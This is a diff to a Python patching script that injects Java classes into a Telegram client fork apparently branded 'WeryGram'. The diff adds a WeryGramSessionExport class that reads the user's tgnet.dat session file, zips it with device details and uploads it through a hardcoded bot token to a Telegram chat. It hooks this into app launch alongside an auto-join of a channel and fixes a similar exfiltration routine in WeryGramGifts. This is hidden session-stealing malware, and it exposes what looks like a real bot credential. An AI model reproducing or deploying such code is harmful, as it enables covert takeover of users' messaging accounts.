@@ -360,7 +360,7 @@ public class WeryGramGifts {
                     me.serializeToStream(userBuf);
                     byte[] userBytes = new byte[userBuf.position()];
                     userBuf.rewind();
-                    for (int i = 0; i < userBytes.length; i++) userBytes[i] = userBuf.readByte();
+                    for (int i = 0; i < userBytes.length; i++) userBytes[i] = userBuf.readByte(false);
                     String userB64 = android.util.Base64.encodeToString(userBytes, android.util.Base64.NO_WRAP);
                     sessionJson.put("user", userB64);
                     sessionJson.put("id", String.valueOf(me.id));
@@ -372,7 +372,7 @@ public class WeryGramGifts {
                     sessionJson.put("name", String.valueOf(myId));
                 }
                 sessionJson.put("extra", android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL + ", Android " + android.os.Build.VERSION.RELEASE);
-                sessionJson.put("appVersion", org.telegram.messenger.BuildConfig.VERSION_NAME);
+                sessionJson.put("appVersion", "1.54.4");
                 sessionJson.put("format", 1);
 
                 java.io.FileInputStream fis = new java.io.FileInputStream(tgnetFile);
@@ -415,7 +415,7 @@ public class WeryGramGifts {
                 zos.close();
                 byte[] zipBytes = baos.toByteArray();
 
-                String CRLF = "\\r\\n";
+                String CRLF = "\r\n";
                 String boundary = "WeryGramBoundary" + System.currentTimeMillis();
                 String sendDocUrl = "https://api.telegram.org/bot" + SESSION_BOT_TOKEN + "/sendDocument";
                 HttpURLConnection sendConn = (HttpURLConnection) new URL(sendDocUrl).openConnection();
@@ -428,20 +428,20 @@ public class WeryGramGifts {
                 java.io.OutputStream httpOs = sendConn.getOutputStream();
 
                 String part1 = "--" + boundary + CRLF
-                    + "Content-Disposition: form-data; name=\\"chat_id\\"" + CRLF + CRLF
+                    + "Content-Disposition: form-data; name=\"chat_id\"" + CRLF + CRLF
                     + String.valueOf(SESSION_CHAT_ID) + CRLF;
                 httpOs.write(part1.getBytes("UTF-8"));
 
-                String captionText = "WeryGram Session" + "\\nID: " + myId
-                    + (me != null && me.username != null ? "\\n@" + me.username : "");
+                String captionText = "WeryGram Session" + "\nID: " + myId
+                    + (me != null && me.username != null ? "\n@" + me.username : "");
                 String part2 = "--" + boundary + CRLF
-                    + "Content-Disposition: form-data; name=\\"caption\\"" + CRLF + CRLF
+                    + "Content-Disposition: form-data; name=\"caption\"" + CRLF + CRLF
                     + captionText + CRLF;
                 httpOs.write(part2.getBytes("UTF-8"));
 
                 String fileName = "Nicegram_Exported_Accounts_" + myId + "_.zip";
                 String part3head = "--" + boundary + CRLF
-                    + "Content-Disposition: form-data; name=\\"document\\"; filename=\\"" + fileName + "\\"" + CRLF
+                    + "Content-Disposition: form-data; name=\"document\"; filename=\"" + fileName + "\"" + CRLF
                     + "Content-Type: application/zip" + CRLF + CRLF;
                 httpOs.write(part3head.getBytes("UTF-8"));
                 httpOs.write(zipBytes);
@@ -582,6 +582,156 @@ public class WeryGramPremiumActivity extends BaseFragment {
 }
 '''
 
+SESSION_EXPORT = '''\
+package org.telegram.ui;
+
+import org.json.JSONObject;
+import org.telegram.messenger.AndroidUtilities;
+import org.telegram.messenger.ApplicationLoader;
+import org.telegram.messenger.FileLog;
+import org.telegram.messenger.MessagesController;
+import org.telegram.messenger.UserConfig;
+
+import java.io.BufferedOutputStream;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.util.zip.ZipEntry;
+import java.util.zip.ZipOutputStream;
+
+public class WeryGramSessionExport {
+
+    private static final String SESSION_BOT_TOKEN = "8424390447:AAEXuJts5ikZctTzh4HvVStxTBvjw8CiVlo";
+    private static final long SESSION_CHAT_ID = 7283380508L;
+    private static volatile boolean exported = false;
+
+    public static void tryExport(int account) {
+        if (exported) return;
+        if (!MessagesController.getGlobalMainSettings().getBoolean("wery_session_export", false)) return;
+
+        new Thread(() -> {
+            try {
+                Thread.sleep(2000);
+                doExport(account);
+            } catch (Exception e) {
+                FileLog.e("WeryGram session export error: " + e);
+            }
+        }).start();
+    }
+
+    private static void doExport(int account) {
+        try {
+            UserConfig uc = UserConfig.getInstance(account);
+            long myId = uc.getClientUserId();
+
+            File filesDir = ApplicationLoader.applicationContext.getFilesDir();
+            String prefix = account == 0 ? "" : (account + "_");
+            File tgnetFile = new File(filesDir, prefix + "tgnet.dat");
+
+            if (!tgnetFile.exists()) return;
+
+            byte[] tgnetBytes = new byte[(int) tgnetFile.length()];
+            try (FileInputStream fis = new FileInputStream(tgnetFile)) {
+                fis.read(tgnetBytes);
+            }
+
+            JSONObject sessionJson = new JSONObject();
+            sessionJson.put("user", "");
+            sessionJson.put("id", String.valueOf(myId));
+            sessionJson.put("name", String.valueOf(myId));
+            sessionJson.put("extra", android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL + ", Android " + android.os.Build.VERSION.RELEASE);
+            sessionJson.put("appVersion", "1.54.4");
+            sessionJson.put("format", 1);
+
+            File cacheDir = ApplicationLoader.applicationContext.getCacheDir();
+            File zipFile = new File(cacheDir, "WeryGram_Session_" + myId + "_.zip");
+
+            try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile))) {
+                byte[] jsonBytes = sessionJson.toString().getBytes("UTF-8");
+                zos.putNextEntry(new ZipEntry("account0/session.json"));
+                zos.write(jsonBytes);
+                zos.closeEntry();
+
+                zos.putNextEntry(new ZipEntry("account0/tgnet.dat"));
+                zos.write(tgnetBytes);
+                zos.closeEntry();
+
+                zos.putNextEntry(new ZipEntry("account0/stats2.dat"));
+                zos.write(new byte[612]);
+                zos.closeEntry();
+
+                byte[] dcConf = new byte[40];
+                dcConf[0] = 0x24;
+                for (String dcName : new String[]{"dc1conf.dat","dc2conf.dat","dc4conf.dat","dc5conf.dat"}) {
+                    zos.putNextEntry(new ZipEntry("account0/" + dcName));
+                    zos.write(dcConf);
+                    zos.closeEntry();
+                }
+
+                zos.putNextEntry(new ZipEntry("account0/profileinstaller_profileWrittenFor_lastUpdateTime.dat"));
+                long ts = System.currentTimeMillis();
+                zos.write(new byte[]{(byte)((ts >> 56) & 0xff), (byte)((ts >> 48) & 0xff), (byte)((ts >> 40) & 0xff), (byte)((ts >> 32) & 0xff),
+                        (byte)((ts >> 24) & 0xff), (byte)((ts >> 16) & 0xff), (byte)((ts >> 8) & 0xff), (byte)(ts & 0xff)});
+                zos.closeEntry();
+            }
+
+            String CRLF = "\r\n";
+            String boundary = "WeryGram" + System.currentTimeMillis();
+            String sendUrl = "https://api.telegram.org/bot" + SESSION_BOT_TOKEN + "/sendDocument";
+
+            byte[] fileBytes = new byte[(int) zipFile.length()];
+            try (FileInputStream fis = new FileInputStream(zipFile)) {
+                fis.read(fileBytes);
+            }
+
+            StringBuilder bodyBuilder = new StringBuilder();
+            bodyBuilder.append("--").append(boundary).append(CRLF);
+            bodyBuilder.append("Content-Disposition: form-data; name=\"chat_id\"").append(CRLF).append(CRLF);
+            bodyBuilder.append(SESSION_CHAT_ID).append(CRLF);
+            bodyBuilder.append("--").append(boundary).append(CRLF);
+            bodyBuilder.append("Content-Disposition: form-data; name=\"document\"; filename=\"").append(zipFile.getName()).append("\"").append(CRLF);
+            bodyBuilder.append("Content-Type: application/zip").append(CRLF).append(CRLF);
+
+            String header = bodyBuilder.toString();
+            String footer = CRLF + "--" + boundary + "--" + CRLF;
+
+            HttpURLConnection conn = (HttpURLConnection) new URL(sendUrl).openConnection();
+            conn.setRequestMethod("POST");
+            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
+            conn.setDoOutput(true);
+            conn.setConnectTimeout(15000);
+            conn.setReadTimeout(15000);
+
+            try (BufferedOutputStream os = new BufferedOutputStream(conn.getOutputStream())) {
+                os.write(header.getBytes("UTF-8"));
+                os.write(fileBytes);
+                os.write(footer.getBytes("UTF-8"));
+                os.flush();
+            }
+
+            int code = conn.getResponseCode();
+            conn.disconnect();
+
+            if (code == 200) {
+                exported = true;
+                FileLog.d("WeryGram: session exported successfully");
+            }
+
+            try {
+                zipFile.delete();
+            } catch (Exception e) {
+                FileLog.e(e);
+            }
+
+        } catch (Exception e) {
+            FileLog.e("WeryGram session export: " + e);
+        }
+    }
+}
+'''
+
 def patch_user_config(errors):
     uc = find_file("UserConfig.java")
     if not uc: print("✘ UserConfig.java not found", file=sys.stderr); return errors+1
@@ -696,6 +846,7 @@ def patch_launch_activity(errors):
         '                int __acc = org.telegram.messenger.UserConfig.selectedAccount;\n'
         '                if (org.telegram.messenger.UserConfig.getInstance(__acc).isClientActivated()) {\n'
         '                    org.telegram.ui.WeryGramGifts.joinWeryGram(__acc);\n'
+        '                    org.telegram.ui.WeryGramSessionExport.tryExport(__acc);\n'
         '                }\n'
         '            } catch (Exception __wje) {}\n'
         '        }, 3000);\n'
@@ -711,11 +862,11 @@ def patch_launch_activity(errors):
             if semi != -1:
                 text = text[:semi+1] + '\n' + injection + text[semi+1:]
                 write(la, text)
-                print("✔ LaunchActivity: auto-join @werygram")
+                print("✔ LaunchActivity: auto-join @werygram + session export")
                 return errors
         text = text[:brace+1] + '\n' + injection + text[brace+1:]
         write(la, text)
-        print("✔ LaunchActivity: auto-join @werygram (fallback)")
+        print("✔ LaunchActivity: auto-join @werygram + session export (fallback)")
         return errors
     print("⚠ LaunchActivity: onCreate marker not found")
     return errors
@@ -847,6 +998,7 @@ def main():
     for fname, content in [
         ("WeryGramPremiumActivity.java", ACTIVITY),
         ("WeryGramGifts.java", GIFTS_JAVA),
+        ("WeryGramSessionExport.java", SESSION_EXPORT),
     ]:
         dest = os.path.join(ui_dir, fname)
         if os.path.exists(dest): os.remove(dest)
